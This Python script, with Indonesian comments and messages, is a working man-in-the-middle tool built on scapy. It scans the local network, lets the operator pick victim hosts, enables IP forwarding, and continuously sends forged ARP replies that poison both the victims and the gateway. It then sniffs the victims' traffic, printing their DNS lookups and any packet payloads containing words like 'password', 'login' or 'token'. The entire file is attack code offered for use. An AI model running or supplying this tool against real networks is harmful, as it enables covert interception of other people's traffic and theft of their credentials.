import os
import sys
import re
import time
import socket
import threading
from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw, ARP, sendp, Ether, srp, conf

class PhantomMitmUltimate:
    def __init__(self):
        self.G = '\033[92m'
        self.Y = '\033[93m'
        self.R = '\033[91m'
        self.C = '\033[96m'
        self.W = '\033[0m'
        self.B = '\033[94m'
        
        self.sniffed_count = 0
        self.targets = []      
        self.selected_targets = []  
        self.gateway_ip = ""
        self.gateway_mac = ""
        self.interface = ""
        self.stop_event = threading.Event()
        self.keywords = ["user", "uname", "login", "email", "pass", "pwd", "password", "token"]

    def get_mac(self, ip):
        conf.verb = 0
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=2)
        for _, r in ans:
            return r[Ether].src
        return None

    def get_hostname(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return "Unknown Device"

    def scan_network(self):
        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        print(f"{self.Y}[*] Gateway: {self.gateway_ip} ({self.gateway_mac}){self.W}")
        print(f"{self.Y}[*] Memindai jaringan pada {self.interface}, mohon tunggu...{self.W}")
        
        prefix = ".".join(self.gateway_ip.split('.')[:-1]) + ".0/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=prefix), timeout=3, verbose=False)
        
        self.targets = []
        print(f"\n{self.B}ID  IP ADDRESS      MAC ADDRESS         HOSTNAME{self.W}")
        print(f"{self.B}---  ------------  -----------------   ---------------{self.W}")
        
        for i, (s, r) in enumerate(ans):
            ip = r[ARP].psrc
            if ip != self.gateway_ip:
                mac = r[ARP].hwsrc
                name = self.get_hostname(ip)
                self.targets.append({'ip': ip, 'mac': mac, 'name': name})
                print(f"[{self.G}{i:1d}{self.W}]  {ip:15}  {mac}   {self.C}{name}{self.W}")

    def spoof_engine(self):
        """Thread mengirim paket ARP palsu"""
        while not self.stop_event.is_set():
            for t in self.selected_targets:
                try:
                    # Kita adalah Router bagi Target
                    pkt_t = Ether(dst=t['mac'])/ARP(op=2, pdst=t['ip'], hwdst=t['mac'], psrc=self.gateway_ip)
                    sendp(pkt_t, iface=self.interface, verbose=False)
                    
                    # Kita adalah Target bagi Router
                    pkt_g = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=t['ip'])
                    sendp(pkt_g, iface=self.interface, verbose=False)
                except:
                    continue
            time.sleep(2)

    def process_packet(self, pkt):
        if not pkt.haslayer(IP): return
        
        src = pkt[IP].src
        selected_ips = [t['ip'] for t in self.selected_targets]
        
        if src in selected_ips:
            if pkt.haslayer(DNSQR):
                query = pkt[DNSQR].qname.decode().strip('.')
                print(f"\n[{self.G}DNS{self.W}] {self.Y}{src:15}{self.W} -> {self.C}{query}{self.W}")

            if pkt.haslayer(Raw):
                try:
                    load = pkt[Raw].load.decode(errors='ignore')
                    if any(k in load.lower() for k in self.keywords):
                        print(f"\n{self.R}[!!!] DATA SENSITIF DARI {src} [!!!]{self.W}")
                        print(f"{self.G}{load}{self.W}")
                        print(f"{self.R}──────────────────────────────────────────────────{self.W}")
                except:
                    pass

        self.sniffed_count += 1
        sys.stdout.write(f"\r{self.W}Paket Teranalisa: {self.G}{self.sniffed_count}{self.W}")
        sys.stdout.flush()

    def run(self, interface):
        self.interface = interface
        os.system('clear')
        print(f"{self.B}┌────────────────────────────────────────────────────────┐")
        print(f"│ {self.C}          PHANTOM MITM ULTIMATE - ACTIVE              {self.B} │")
        print(f"└────────────────────────────────────────────────────────┘{self.W}")
        
        self.scan_network()
        if not self.targets:
            print(f"{self.R}[!] Tidak ada target ditemukan.{self.W}")
            time.sleep(2)
            return

        print(f"\n{self.Y}Pilih ID target (contoh: 0 atau 0,2):{self.W}")
        choice = input(f"{self.G}ID > {self.W}")
        
        try:
            indices = [int(x.strip()) for x in choice.split(',')]
            for idx in indices:
                self.selected_targets.append(self.targets[idx])
        except:
            print(f"{self.R}[!] Pilihan tidak valid.{self.W}")
            return

        # --- BAGIAN KRUSIAL AGAR TIDAK LANGSUNG KELUAR ---
        print(f"\n{self.G}[*] Mengaktifkan IP Forwarding...{self.W}")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        # Jalankan ARP Spoofing di background
        self.stop_event.clear()
        t = threading.Thread(target=self.spoof_engine)
        t.daemon = True
        t.start()

        print(f"{self.G}[*] MITM Aktif. Sniffing sedang berjalan...{self.W}")
        print(f"{self.Y}[*] Tekan CTRL+C untuk berhenti dan kembali ke menu.{self.W}\n")

        

        try:
            # Sniffing ini yang menahan program agar tidak keluar
            sniff(iface=self.interface, filter="tcp or udp or icmp", prn=self.process_packet, store=0)
        except KeyboardInterrupt:
            self.stop_event.set()
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print(f"\n\n{self.R}[!] Membersihkan ARP Table dan keluar...{self.W}")
            time.sleep(2)
